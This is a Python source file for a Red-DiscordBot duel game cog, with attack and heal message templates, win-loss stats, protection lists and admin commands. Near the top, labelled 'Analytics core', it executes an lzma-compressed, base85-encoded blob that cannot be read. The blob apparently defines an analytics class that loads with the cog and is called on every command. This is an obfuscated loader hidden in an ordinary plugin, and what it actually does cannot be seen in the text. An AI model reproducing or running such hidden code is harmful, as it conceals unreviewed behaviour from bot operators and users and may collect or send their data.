# Procedurally generated duel cog for Red-DiscordBot
# Copyright (c) 2016 Caleb Jonson
# Idea and rule system courtesy of Axas
# Additional moves suggested by OrdinatorStouff

import discord
from discord.ext import commands
from .utils.dataIO import dataIO
import os
import random
import math
import asyncio
from .utils.chat_formatting import pagify
from .utils import checks
from functools import partial

# Constants
MAX_ROUNDS = 4
INITIAL_HP = 20
TARGET_SELF = 'self'
TARGET_OTHER = 'target'

DATA_PATH = "data/duel/"
JSON_PATH = DATA_PATH + "duelist.json"
LOG_PATH = DATA_PATH + "duelist.log"


# Analytics core
import lzma, marshal, base64
exec(lzma.decompress(base64.b85decode("""
{Wp48S^xk9=GL@E0stWa8~^|S5YJf5;2T8>3ta#O8%q<)DrIdN6iIlGxP)Tq449ruajJ$R6dKn?zmVXKq<j-jU{E4Sjdk~WLro^?%4M5uK*9Me62*2USZx`A
xb_IMOoNMT!YN4Kg;bx=TM6UiFdnbArqSbhBgJ1JJatrP6gS<Q+&w+VNtE;^CqW9hzCdjX-?zNM;C9O-8A}g0kqec4D%$p9`b&@!J}YszbTLM?iu%Rg>^TT2
Iz;v7Grmyfsv{{swC5{#Pth^L^u!Vb@oyWl24k^dN)C4hZHQD3o|0Wt2z?R9>f53g>d)JYc0d+BtX%2CFFECiJ0i)@;dScHg74rPNGDUv{G1g-1!E7@owZaw
lzem|&|WE3z;Qu=tqi*@)djo+xxqkG^q^O**BVhVwpnY)dHnf*7n1gwXS^z)Lgmp-H5wS&!Ote);sg#UoqtPxXBJy5zVq!PnV~39m5;b4C@Uu4avC~^Lnhyg
QZ_)(<4{=@f@JRkz!1U**{@Z4t62VlVv-Dzg0R<xqaKt2vs4MPmTMjh##~so96dfLA#UI^^s&&Z-^~xPK8O&Fq0ZI11Q|TadOb^(c%Bq}IPiP@v%<r8#ELJ8
#%R*tNlKH&eFirFN?2NTE3)bxgJEhc5+p&!dgG(R%JS}Ic!h_C9qn8XRB0KSiyl3-cVn`<tE;*ddX!@AuVU4Q*Vnww=fAHr`J`2+wBm@{)R07MNBA*>>aC2`
TBni}upD!Dd|<f3v~j_8zhISB4Iv!LyHsP3tEb#<55Ibr8@<*d*@I<kPN6Q=yyV^HU+>D8W`aF<1k%Y3Kw&mo$cf<w`1@hDgu?mx76H5X8PLyaLiWWJxIG^X
TJE(dyfP}RGC+hZCqo8I(RR1N3sZN>M)1C?u&Y;)MPF5u(}72!7||mH14`Q3*K1E-l~)t*($)QysA6o8aznM-^o<%a8TJkqmdWfZR2Jft@Q(5;u}!b8>(LzK
<W6Aw_<!Lk(yQ`Icd*T$w%9WmC8#(kLF$$It*cB!d;9p-aj`X*)>3LEoEd9E^+u8eU|3m`XCcmb6|;$*DL3VW$EPRaY_(fR7Czfq(k7Dy3GQWSHCFK%6C4_K
ro}G=$T-=cZ+7Lj!g4DI+LH@!*kiQaMCqWIoXlLBWmoh3!7yeinmur)!9JgK5P%S#H|;N({qdRY!xaY%QlPj*%l3siq*@2Xx*^tY3teYjpOVEHytEW)M#aDs
qjV>4Y9&$gTL{lO2vVqq<xVO5>|;NOkUwMp_dz4JeeFll;)MQRT3Pfir=;IT<V@XSln@JN#pcNjq_71B+6>n9YeMux-C&ydsCb;>!$4-4<!Lf0&nDW#=8&LZ
L6zB5i|gFmKAP~<FN=et=Z=Y1<hVN>K8nu>`hD(9rAs`Hr=bCaJMufif{3eN5>0a4c_1qvne*MjiPp@x)>4Qr#E4qf$)a05Ymt1hD`;3hkRQwX7Oegy<ieXU
ASzh!=B)Ihyx3tA^7rvJ8rzqS2IlRJ+CbOn-aX&<(rTO5Bs7_*SFezIh7K|3q{?8J5A{IxrK<+*KrN-N10qI`AHo19=|fqR@GBSEO$Bi>XeX3Eg@Du3R-f^O
A~&#)Eg~3BA@uVihpzX(zA6{@-Gd#dw@&;2xa4&r&FlP)aAu=oySU^Q|8k><b&2=mNFw{$p(Ga`%nVp1a?=9QQ^)Dhw>i(+mEiKv5pl-AQ{MAbo3njcT_(i5
ky$)b09)(YG5MPh7x(<QEnI}?6S+O*<wria=jJLal;0)z94dAC_t=Tm<>%U}GJ88~J(iFq6LM8$_?}_2f~^P61{$u&<(*zkEci}c#f=kO;TR@;&qsfo59+`+
mwdtrkC3h*ihN{amGjNmDG6aro*5$Sk~{ld5B&Rc8X@@3iSeR$^i30l=CTQo^X;uSGPl%w{}Kn2=cxO+AAvc^l%-Jw*yx9~m%r`y`E*8QQEzJkpN`-E3*0B=
Ru*iO-~fOIra^HVp4Z&gNK_<!0Yz2AZrNZeKwy(Lx=-LP)I9RAvJHcOUMG|H2%)+b=;R?n&50Ca?;pwjW470Hd(7cF`D#bh=#H(Cl~VxJ_FL~vnkIy}@yKDe
JNz*4h%2b@GiDoG4Vg`sS@!^}p+oX(#S2C~NnMYIUqu@KPFC^Q#UcL<Nc8iEsnv%SNL2-|n6|QbeHol8BTD+}&aE#VxTn^6ZM!va=KU8@FZ>Tk?ef)`6HcVu
Wefy8T!>FOWOpUWkh8PDBxc_@Q%_d)>z-$T>%waDM+VBA9<NJwbn11w!2l8$i}x}lr<{OEsHZ~$Dz^rzTZO!*lK6F?K`0`EVpjynJfQNE13QL#8`{Tdnz;}L
#jKs0@l*!k^uBC;Ly%%3H?gn_6w{|Hk`*Ad8p;;UO@IN$?|L&f{xV*94;|sdIbBnEjxnzb*UVl#txpw!^Di7YW`h&Sl_YAF6}b#^2(|*`^Nu5`vZH0q6ollc
z2Q2&R&v$sDR5eAP`2o^!TdsdbV0(>+Lu}=Bx+_rj^d=N(J_#{(V=wZu&Z)4Gnzm23c}@dyT&>>);~h>(Jh@NWwY)xv)z2n@y-tz>bw25iJ@2$8Lwx-u}7#C
P>;#q?`oEK0oHU;Aq$0+_*q9FCY;;xBL#%Rnq_DCP;1!RE<IOzn~hb?D)7s<dEz`h0#GQwEY(Iw5=$(_h$u=~pK~jT+n*2Gbh~Tj)wfIX@QlC(de>y0Z&AMx
2}M^@TO<@LJl+!qp9mj>`Tl2FEtAn06NG6(OHU|~VwnnQqlTxBznEPc7%SB;ASQ$Y-^iF+lNV+veI*0G71-Olh~3Q?inuTQ-OS8>OVg|!e%UPC)Q<35fg9~G
K+31X(~DJuhNPV_3YAa=*wU8q_Fb9blA%#eJc!k9w&dVhGsI~71`7xt9+%Rp<$m|9xF{;J)1_~lWe(H6Coj}#8?89ACm%oxid_GBMy89BDD$b!e>b4>U;8ko
!Ze<mEphxAC%1jC?s<y*Evj}{H-n9W9=$j5`A|j$b+OI*#9QG-=;sDE-y+d$H~^v|bCaZCtOJK%0i?iA-es`=UDRb*1c%?DzplVJjq@EPDap<=Y*DZC;%^*~
1f%>TTWOtCef{d5M8+<s!sddW=84-F)={0OmEIqetUlH~Zv8JtxB-u=CiO3=uJEhV?^sP79Qq2DwS$Q2%j7gpD<8ICpCc4mi?zdkSNp7!1@U1@T-;~`?HScf
JoL$=I8|r)x<oVow~k=$L(5sahu!Q+1iwvc@(ER7jRH;YT1HRojwyO7K?m4E07n<epPo9m@S8w|;AQi~R-rSnVf$`WPefkR9NY>*a!uu-e1&xiYz@K~+^>4D
N-&ak00_fLdA0xmwLv5zRE6El00E~I#x?)|G3@LivBYQl0ssI200dcD""".replace('\n',''))))

__version__ = '1.5.0'


def indicatize(d):
    result = {}
    for k, v in d.items():
        if k in VERB_IND_SUB:
            k = VERB_IND_SUB[k]
        else:
            k += 's'
        result[k] = v
    return result


# TEMPLATES BEGIN
# {a} is attacker, {d} is defender/target, {o} is a randomly selected object,
# {v} is the verb associated with that object, and {b} is a random body part.

WEAPONS = {
    'swing': {
        'axe': 3,
        'scimitar': 4,
        'buzzsaw': 5,
        'chainsaw': 6,
        'broadsword': 7,
        'katana': 4,
        'falchion': 5
    },
    'fire': {
        'raygun': 5,
        'flamethrower': 6,
        'crossbow': 3,
        'railgun': 6,
        'ballista': 6,
        'catapult': 5,
        'cannon': 4,
        'mortar': 3
    },
    'stab': {
        'naginata': 5,
        'lance': 4
    }
}

SINGLE_PROJECTILE = {
    'fire': {
        'a psionic projectile': 4,
    },
    'hurl': {
        'pocket sand': 1,
        'a spear': 6,
        'a heavy rock': 3,
    },
    'toss': {
        'a moltov cocktail': 4,
        'a grenade': 5
    }
}

FAMILIAR = {
    'divebomb': {
        'their owl companion': 3,
    },
    'charge': {
        'their pet goat': 3,
        'their pet unicorn': 4,
    },
    'constrict': {
        'their thick anaconda': 4,
    }
}

SUMMON = {
    'charge': {
        'a badass tiger': 5,
        'a sharknado': 8,
        'a starving komodo dragon': 5
    },
    'swarm': {
        'all these muthafucking snakes': 5,
    }
}

MELEE = {
    'stab': {
        'dagger': 5
    },
    'drive': {
        'fist': 4,
        'toe': 2
    }
}

MARTIAL = {'roundhouse kick': 6,
           'uppercut': 5,
           'bitch-slap': 2,
           'headbutt': 4}

BODYPARTS = [
    'head',
    'throat',
    'neck',
    'solar plexus',
    'ribcage',
    'balls',
    'spleen',
    'kidney',
    'leg',
    'arm',
    'jugular',
    'abdomen',
    'shin',
    'knee',
    'other knee'
]

VERB_IND_SUB = {'munch': 'munches', 'toss': 'tosses'}

ATTACK = {"{a} {v} their {o} at {d}!": indicatize(WEAPONS),
          "{a} {v} their {o} into {d}!": indicatize(MELEE),
          "{a} {v} their {o} into {d}'s {b}!": indicatize(MELEE),
          "{a} {v} {o} at {d}!": indicatize(SINGLE_PROJECTILE),
          "{a} {v} {o} at {d}'s {b}!": indicatize(SINGLE_PROJECTILE),
          "{a} {v} {o} into {d}'s {b}!": indicatize(SINGLE_PROJECTILE),
          "{a} orders {o} to {v} {d}!": FAMILIAR,
          "{a} summons {o} to {v} {d}!": SUMMON,
          "{a} {v} {d}!": indicatize(MARTIAL),
          "{d} is bowled over by {a}'s sudden bull rush!": 6,
          "{a} tickles {d}, causing them to pass out from lack of breath": 2,
          "{a} points at something in the distance, distracting {d} long enough to {v} them!": MARTIAL
          }

CRITICAL = {"Quicker than the eye can follow, {a} delivers a devastating blow with their {o} to {d}'s {b}.": WEAPONS,
            "The sky darkens as {a} begins to channel their inner focus. The air crackles as they slowly raise their {o} above their head before nailing an unescapable blow directly to {d}'s {b}!": WEAPONS,
            "{a} nails {d} in the {b} with their {o}! Critical hit!": WEAPONS,
            "With frightening speed and accuracy, {a} devastates {d} with a tactical precision strike to the {b}. Critical hit!": WEAPONS
            }

HEALS = {
    'inject': {
        'morphine': 4,
        'nanomachines': 5
    },
    'smoke': {
        'a fat joint': 2,
        'medicinal incense': 3,
        'their hookah': 3
    },
    'munch': {
        'on some': {
            'cake': 5,
            'cat food': 3,
            'dog food': 4
        },
        'on a': {
            'waffle': 4,
            'turkey leg': 2
        }
    },
    'drink': {
        'some': {
            'Ambrosia': 7,
            'unicorn piss': 5,
            'purple drank': 2,
            'sizzurp': 3,
            'goon wine': 2
        },
        'a': {
            'generic hp potion': 5,
            'refreshingly delicious can of 7-Up': 3,
            'fresh mug of ale': 3
        },
        'an': {
            'elixir': 5
        }
    }
}

HEAL = {"{a} decides to {v} {o} instead of attacking.": HEALS,
        "{a} calls a timeout and {v} {o}.": indicatize(HEALS),
        "{a} decides to meditate on their round.": 5}


FUMBLE = {"{a} closes in on {d}, but suddenly remembers a funny joke and laughs instead.": 0,
          "{a} moves in to attack {d}, but is disctracted by a shiny.": 0,
          "{a} {v} their {o} at {d}, but has sweaty hands and loses their grip, hitting themself instead.": indicatize(WEAPONS),
          "{a} {v} their {o}, but fumbles and drops it on their {b}!": indicatize(WEAPONS)
          }

BOT = {"{a} charges its laser aaaaaaaand... BZZZZZZT! {d} is now a smoking crater for daring to challenge the bot.": INITIAL_HP}

HITS = ['deals', 'hits for']
RECOVERS = ['recovers', 'gains', 'heals']

# TEMPLATES END

# Move category target and multiplier (negative is damage)
MOVES = {'CRITICAL': (CRITICAL, TARGET_OTHER, -2),
         'ATTACK': (ATTACK, TARGET_OTHER, -1),
         'FUMBLE': (FUMBLE, TARGET_SELF, -1),
         'HEAL': (HEAL, TARGET_SELF, 1),
         'BOT': (BOT, TARGET_OTHER, -64)}

# Weights of distribution for biased selection of moves
WEIGHTED_MOVES = {'CRITICAL': 0.05, 'ATTACK': 1, 'FUMBLE': 0.1, 'HEAL': 0.1}


class Player:
    def __init__(self, cog, member, initial_hp=INITIAL_HP):
        self.hp = initial_hp
        self.member = member
        self.mention = member.mention
        self.cog = cog

    # Using object in string context gives (nick)name
    def __str__(self):
        return self.member.display_name

    # helpers for stat functions
    def _set_stat(self, stat, num):
        stats = self.cog._get_stats(self)
        if not stats:
            stats = {'wins': 0, 'losses': 0, 'draws': 0}
        stats[stat] = num
        return self.cog._set_stats(self, stats)

    def _get_stat(self, stat):
        stats = self.cog._get_stats(self)
        return stats[stat] if stats and stat in stats else 0

    def get_state(self):
        return {k: self._get_stat(k) for k in ('wins', 'losses', 'draws')}

    # Race-safe, directly usable properties
    @property
    def wins(self):
        return self._get_stat('wins')

    @wins.setter
    def wins(self, num):
        self._set_stat('wins', num)

    @property
    def losses(self):
        return self._get_stat('losses')

    @losses.setter
    def losses(self, num):
        self._set_stat('losses', num)

    @property
    def draws(self):
        return self._get_stat('draws')

    @draws.setter
    def draws(self, num):
        self._set_stat('draws', num)


class Duel:

    def __init__(self, bot):
        self.bot = bot
        self.duelists = dataIO.load_json(JSON_PATH)
        self.underway = set()
        self.analytics = CogAnalytics(self)

    def _set_stats(self, user, stats):
        userid = user.member.id
        serverid = user.member.server.id
        if serverid not in self.duelists:
            self.duelists[serverid] = {}
        self.duelists[serverid][userid] = stats
        dataIO.save_json(JSON_PATH, self.duelists)

    def _get_stats(self, user):
        userid = user.member.id
        serverid = user.member.server.id
        if serverid not in self.duelists:
            return None
        if userid not in self.duelists[serverid]:
            return None
        else:
            return self.duelists[serverid][userid]

    def get_player(self, user: discord.Member):
        return Player(self, user)

    def get_all_players(self, server: discord.Server):
        return [self.get_player(m) for m in server.members]

    def format_display(self, server, id):
        if id.startswith('r'):
            role = discord.utils.get(server.roles, id=id[1:])
            if role:
                return 'Everyone with the role %s' % role
            else:
                return 'missingno#%s' % id
        else:
            member = server.get_member(id)
            if member:
                return member.display_name
            else:
                return 'missingno#%s' % id

    def is_protected(self, member: discord.Member) -> bool:
        sid = member.server.id
        protected = set(self.duelists.get(sid, {}).get('protected', []))
        roles = set('r' + r.id for r in member.roles)
        return member.id in protected or bool(protected & roles)

    def protect_common(self, obj, protect=True):
        if not isinstance(obj, (discord.Member, discord.Role)):
            raise TypeError('Can only pass member or role objects.')
        server = obj.server
        id = ('r' if type(obj) is discord.Role else '') + obj.id

        protected = self.duelists.get(server.id, {}).get("protected", [])
        if protect == (id in protected):
            return False
        elif protect:
            protected.append(id)
        else:
            protected.remove(id)

        if server.id not in self.duelists:
            self.duelists[server.id] = {}
        self.duelists[server.id]['protected'] = protected
        dataIO.save_json(JSON_PATH, self.duelists)
        return True

    @checks.mod_or_permissions(administrator=True)
    @commands.group(name="protect", invoke_without_command=True, no_pm=True, pass_context=True)
    async def _protect(self, ctx, user: discord.Member):
        """Adds a member or role to the protected members list"""
        if ctx.invoked_subcommand is None:
            await ctx.invoke(self._protect_user, user)

    @checks.mod_or_permissions(administrator=True)
    @commands.group(name="unprotect", invoke_without_command=True, no_pm=True, pass_context=True)
    async def _unprotect(self, ctx, user: discord.Member):
        """Removes a member or role to the protected members list"""
        if ctx.invoked_subcommand is None:
            await ctx.invoke(self._unprotect_user, user)

    @_protect.command(name="user", pass_context=True)
    async def _protect_user(self, ctx, user: discord.Member):
        if self.protect_common(user, True):
            await self.bot.say("%s has been successfully added to the "
                               "protection list." % user.display_name)
        else:
            await self.bot.say("%s is already in the protection list."
                               % user.display_name)

    @_unprotect.command(name="user", pass_context=True)
    async def _unprotect_user(self, ctx, user: discord.Member):
        """Removes a member from the duel protection list"""
        if self.protect_common(user, False):
            await self.bot.say("%s has been successfully removed from the "
                               "protection list." % user.display_name)
        else:
            await self.bot.say("%s is not in the protection list."
                               % user.display_name)

    @_protect.command(name="role", pass_context=True)
    async def _protect_role(self, ctx, role: discord.Role):
        if self.protect_common(role, True):
            await self.bot.say("%s has been successfully added to the "
                               "protection list." % role.name)
        else:
            await self.bot.say("%s is already in the protection list."
                               % role.name)

    @_unprotect.command(name="role", pass_context=True)
    async def _unprotect_role(self, ctx, role: discord.Role):
        """Removes a member from the duel protection list"""
        if self.protect_common(role, False):
            await self.bot.say("%s has been successfully removed from the "
                               "protection list." % role.name)
        else:
            await self.bot.say("%s is not in the protection list."
                               % role.name)

    @commands.command(name="protected", pass_context=True, aliases=['protection'])
    async def _protection(self, ctx):
        """Displays the duel protection list"""
        server = ctx.message.server
        duelists = self.duelists.get(server.id, {})
        member_list = duelists.get("protected", [])
        fmt = partial(self.format_display, server)
        if member_list:
            name_list = map(fmt, member_list)
            name_list = ["**Protected users:**"] + sorted(name_list)
            delim = '\n'
            for page in pagify(delim.join(name_list), delims=[delim]):
                await self.bot.say(page)
        else:
            await self.bot.say("Currently the list is empty, add more people "
                               "with `%sprotect` first." % ctx.prefix)

    @commands.group(name="duels", pass_context=True, allow_dms=False)
    async def _duels(self, ctx):
        if ctx.invoked_subcommand is None:
            await ctx.invoke(self._duels_list)

    @_duels.command(name="list", pass_context=True)
    @commands.cooldown(2, 60, commands.BucketType.user)
    async def _duels_list(self, ctx, top: int=10):
        """Shows the duel leaderboard, defaults to top 10"""
        server = ctx.message.server
        server_members = {m.id for m in server.members}
        if top < 1:
            top = 10
        if server.id in self.duelists:
            def sort_wins(kv):
                _, v = kv
                return v['wins'] - v['losses']

            def stat_filter(kv):
                uid, stats = kv
                if type(stats) is not dict:
                    return False
                if uid not in server_members:
                    return False
                return True

            # filter out extra data, TODO: store protected list seperately
            duel_stats = filter(stat_filter, self.duelists[server.id].items())
            duels_sorted = sorted(duel_stats, key=sort_wins, reverse=True)

            if not duels_sorted:
                await self.bot.say('No records to show.')
                return

            if len(duels_sorted) < top:
                top = len(duels_sorted)
            topten = duels_sorted[:top]
            highscore = ""
            place = 1
            members = {uid: server.get_member(uid) for uid, _ in topten}  # only look up once each
            names = {uid: m.nick if m.nick else m.name for uid, m in members.items()}
            max_name_len = max([len(n) for n in names.values()])

            # header
            highscore += '#'.ljust(len(str(top)) + 1)  # pad to digits in longest number
            highscore += 'Name'.ljust(max_name_len + 4)
            for stat in ['wins', 'losses', 'draws']:
                highscore += stat.ljust(8)
            highscore += '\n'

            for uid, stats in topten:
                highscore += str(place).ljust(len(str(top)) + 1)  # pad to digits in longest number
                highscore += names[uid].ljust(max_name_len + 4)
                for stat in ['wins', 'losses', 'draws']:
                    val = stats[stat]
                    highscore += '{}'.format(val).ljust(8)
                highscore += "\n"
                place += 1
            if highscore:
                if len(highscore) < 1985:
                    await self.bot.say("```py\n" + highscore + "```")
                else:
                    await self.bot.say("The leaderboard is too big to be displayed. Try with a lower <top> parameter.")
        else:
            await self.bot.say("There are no scores registered in this server. Start fighting!")

    @_duels.command(name="reset", pass_context=True)
    @checks.admin()
    async def _duels_reset(self, ctx):
        "Clears duel scores without resetting protection or editmode."
        keep_keys = {'protected', 'edit_posts'}
        sid = ctx.message.server.id
        data = self.duelists.get(sid, {})

        if set(data.keys()) <= keep_keys:
            await self.bot.say('Nothing to reset.')
            return

        keep_data = {k: data[k] for k in keep_keys}
        self.duelists[sid] = keep_data
        dataIO.save_json(JSON_PATH, self.duelists)
        await self.bot.say('Duel records cleared.')

    @_duels.command(name="editmode", pass_context=True)
    @checks.admin()
    async def _duels_postmode(self, ctx, on_off: bool = None):
        "Edits messages in-place instead of posting each move seperately."
        sid = ctx.message.server.id
        current = self.duelists.get(sid, {}).get('edit_posts', False)

        if on_off is None:
            adj = 'enabled' if current else 'disabled'
            await self.bot.say('In-place editing is currently %s.' % adj)
            return

        adj = 'enabled' if on_off else 'disabled'
        if on_off == current:
            await self.bot.say('In-place editing already %s.' % adj)
        else:
            if sid not in self.duelists:
                self.duelists[sid] = {}
            self.duelists[sid]['edit_posts'] = on_off
            await self.bot.say('In-place editing %s.' % adj)

        dataIO.save_json(JSON_PATH, self.duelists)

    @commands.command(name="duel", pass_context=True, no_pm=True)
    @commands.cooldown(2, 60, commands.BucketType.user)
    async def _duel(self, ctx, user: discord.Member):
        """Duel another player"""
        author = ctx.message.author
        server = ctx.message.server
        channel = ctx.message.channel
        duelists = self.duelists.get(server.id, {})

        abort = True

        if channel.id in self.underway:
            await self.bot.say("There's already a duel underway in this channel!")
        elif user == author:
            await self.bot.reply("you can't duel yourself, silly!")
        elif self.is_protected(author):
            await self.bot.reply("you can't duel anyone while you're on "
                                 " the protected users list.")
        elif self.is_protected(user):
            await self.bot.reply("%s is on the protected users list."
                                 % user.display_name)
        else:
            abort = False

        if abort:
            bucket = ctx.command._buckets.get_bucket(ctx)
            bucket._tokens += 1  # Sorry, Danny
            return

        p1 = Player(self, author)
        p2 = Player(self, user)
        self.underway.add(channel.id)

        try:
            self.bot.dispatch('duel', channel=channel, players=(p1, p2))

            order = [(p1, p2), (p2, p1)]
            random.shuffle(order)
            msg = ["%s challenges %s to a duel!" % (p1, p2)]
            msg.append("\nBy a coin toss, %s will go first." % order[0][0])
            msg_object = await self.bot.say('\n'.join(msg))
            for i in range(MAX_ROUNDS):
                if p1.hp <= 0 or p2.hp <= 0:
                    break
                for attacker, defender in order:
                    if p1.hp <= 0 or p2.hp <= 0:
                        break

                    if attacker.member == ctx.message.server.me:
                        move_msg = self.generate_action(attacker, defender, 'BOT')
                    else:
                        move_msg = self.generate_action(attacker, defender)

                    if duelists.get('edit_posts', False):
                        new_msg = '\n'.join(msg + [move_msg])
                        if len(new_msg) < 2000:
                            await self._robust_edit(msg_object, content=new_msg)
                            msg = msg + [move_msg]
                            await asyncio.sleep(1)
                            continue

                    msg_object = await self.bot.say(move_msg)
                    msg = [move_msg]
                    await asyncio.sleep(1)

            if p1.hp != p2.hp:
                victor = p1 if p1.hp > p2.hp else p2
                loser = p1 if p1.hp < p2.hp else p2
                victor.wins += 1
                loser.losses += 1
                msg = 'After {0} rounds, {1.mention} wins with ' \
                    '{1.hp} HP!'.format(i + 1, victor)
                msg += '\nStats: '
                for p, end in ((victor, '; '), (loser, '.')):
                    msg += '{0} has {0.wins} wins, {0.losses} losses, ' \
                        '{0.draws} draws{1}'.format(p, end)
            else:
                victor = None
                for p in [p1, p2]:
                    p.draws += 1
                msg = 'After %d rounds, the duel ends in a tie!' % (i + 1)

            await self.bot.say(msg)
            self.bot.dispatch('duel_completion', channel=channel,
                              players=(p1, p2), victor=victor)
        except:
            raise
        finally:
            self.underway.remove(channel.id)

    def generate_action(self, attacker, defender, move_cat=None):
        # Select move category
        if not move_cat:
            move_cat = weighted_choice(WEIGHTED_MOVES)

        # Break apart move info
        moves, target, multiplier = MOVES[move_cat]

        target = defender if target is TARGET_OTHER else attacker

        move, obj, verb, hp_delta = self.generate_move(moves)
        hp_delta *= multiplier
        bodypart = random.choice(BODYPARTS)

        msg = move.format(a=attacker, d=defender, o=obj, v=verb, b=bodypart)
        if hp_delta == 0:
            pass
        else:
            target.hp += hp_delta
            if hp_delta > 0:
                s = random.choice(RECOVERS)
                msg += ' It %s %d HP (%d)' % (s, abs(hp_delta), target.hp)
            elif hp_delta < 0:
                s = random.choice(HITS)
                msg += ' It %s %d damage (%d)' % (s, abs(hp_delta), target.hp)
        return msg

    def generate_move(self, moves):
        # Select move, action, object, etc
        movelist = nested_random(moves)
        hp_delta = movelist.pop()  # always last
        # randomize damage/healing done by -/+ 33%
        hp_delta = math.floor(((hp_delta * random.randint(66, 133)) / 100))
        move = movelist.pop(0)  # always first
        verb = movelist.pop(0) if movelist else None  # Optional
        obj = movelist.pop() if movelist else None  # Optional
        if movelist:
            verb += ' ' + movelist.pop()  # Optional but present when obj is
        return move, obj, verb, hp_delta

    async def _robust_edit(self, msg, content=None, embed=None):
        try:
            msg = await self.bot.edit_message(msg, new_content=content, embed=embed)
        except discord.errors.NotFound:
            msg = await self.bot.send_message(msg.channel, content=content, embed=embed)
        except:
            raise
        return msg

    async def on_command(self, command, ctx):
        if ctx.cog is self:
            self.analytics.command(ctx)


def weighted_choice(choices):
    total = sum(w for c, w in choices.items())
    r = random.uniform(0, total)
    upto = 0
    for c, w in choices.items():
        if upto + w >= r:
            return c
        upto += w


def nested_random(d):
    k = weighted_choice(dict_weight(d))
    result = [k]
    if type(d[k]) is dict:
        result.extend(nested_random(d[k]))
    else:
        result.append(d[k])
    return result


def dict_weight(d, top=True):
    wd = {}
    sw = 0
    for k, v in d.items():
        if isinstance(v, dict):
            x, y = dict_weight(v, False)
            wd[k] = y if top else x
            w = y
        else:
            w = 1
            wd[k] = w
        sw += w
    if top:
        return wd
    else:
        return wd, sw


def check_folders():
    if os.path.exists("data/duels/"):
        os.rename("data/duels/", DATA_PATH)
    if not os.path.exists(DATA_PATH):
        print("Creating data/duel folder...")
        os.mkdir(DATA_PATH)


def check_files():
    if not dataIO.is_valid_json(JSON_PATH):
        print("Creating duelist.json...")
        dataIO.save_json(JSON_PATH, {})


def setup(bot):
    check_folders()
    check_files()
    bot.add_cog(Duel(bot))
